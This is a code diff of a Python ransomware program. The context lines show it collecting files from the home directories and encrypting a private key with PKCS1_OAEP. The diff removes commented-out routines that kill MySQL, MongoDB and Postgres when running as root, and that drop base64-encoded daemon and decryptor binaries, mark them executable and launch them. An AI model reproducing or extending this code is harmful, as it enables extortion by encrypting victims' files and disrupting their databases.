@@ -21,16 +21,6 @@ from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 
 
-# def kill_databases():
-#     if(os.getuid() == 0):
-#         mysql = 'mysqld stop; mysql.server stop'
-#         mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
-#         postgres = 'pkill -u postgres; pkill postgres'
-#
-#         os.system(mysql)
-#         os.system(mongo)
-#         os.system(postgres)
-
 
 def encrypt_priv_key(msg, key):
     n = 127
@@ -83,7 +73,6 @@ def menu():
     except OSError:
         pass
 
-    #kill_databases()
 
     files = get_files.find_files(variables.home)+get_files.find_files("/home/")
 
@@ -136,20 +125,5 @@ def menu():
     gc.collect()
 
 
-# def drop_daemon_and_decryptor():
-#     with open(variables.decryptor_path,'wb') as f:
-#         f.write(base64.b64decode(variables.decryptor))
-#
-#     with open(variables.daemon_path, 'wb') as f:
-#         f.write(base64.b64decode(variables.daemon))
-#
-#     os.chdir(variables.ransomware_path)
-#     os.system('chmod +x daemon')
-#     os.system('chmod +x decryptor')
-#     utils.run_subprocess('./daemon')
-
-
 if __name__ == "__main__":
     menu()
-    #utils.change_wallpaper()
-    #drop_daemon_and_decryptor()
